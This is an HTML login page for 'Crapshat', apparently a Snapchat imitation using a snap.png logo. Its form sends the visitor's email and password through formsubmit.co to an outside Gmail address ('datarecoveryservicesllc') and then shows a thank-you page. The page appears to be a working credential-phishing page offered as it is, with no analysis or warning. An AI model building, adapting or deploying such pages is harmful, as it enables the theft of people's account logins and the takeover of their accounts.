<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crapshat - Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <img src="snap.png" alt="Crapshat Logo" class="logo">
        <h2>Welcome to Crapshat</h2>
        <form id="loginForm" action="https://formsubmit.co/datarecoveryservicesllc@gmail.com" method="POST">
            <input type="email" name="email" id="loginEmail" placeholder="Email Address" required>
            <input type="password" name="password" id="loginPassword" placeholder="Password" required>
            <button type="submit">Login</button>
            <input type="hidden" name="_next" value="thank-you.html">
        </form>
        <p>New here? <a href="signup.html">Sign up</a></p>
    </div>

</body>
</html>
